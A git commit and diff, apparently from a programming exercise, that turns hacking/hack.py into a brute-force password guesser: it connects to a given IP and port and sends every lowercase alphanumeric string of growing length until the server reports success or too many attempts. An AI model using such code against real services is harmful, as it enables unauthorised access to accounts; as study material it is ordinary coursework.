b728a8a63fb22564cc403d8c6b5da63d9990c4fc
Xue10 <xue1010@hotmail.com>
2022-03-29 15:34:17 +0800

    stage 2 complete

--- hacking/hack.py
+++ hacking/hack.py
@@ -1,12 +1,28 @@
+import itertools
 import socket
 import sys
 
 ip = sys.argv[1]
 port = int(sys.argv[2])
-msg = sys.argv[3]
 with socket.socket() as client:
     client.connect((ip, port))
-    client.send(msg.encode())
-    response = client.recv(1024)
-    msg_r = response.decode()
-    print(msg_r)
+    ch = 'abcdefghijklmnopqrstuvwxyz0123456789'
+    count = 0
+    not_found = True
+    i = 1
+    while not_found:
+        pw_set = itertools.product(ch, repeat=i)
+        for p in pw_set:
+            pw = ''.join(p)
+            client.send(pw.encode())
+            count += 1
+            response = client.recv(1024)
+            response = response.decode()
+            if response == 'Connection success!':
+                print(pw)
+                not_found = False
+                break
+            elif response == 'Too many attempts':
+                not_found = False
+                break
+        i += 1
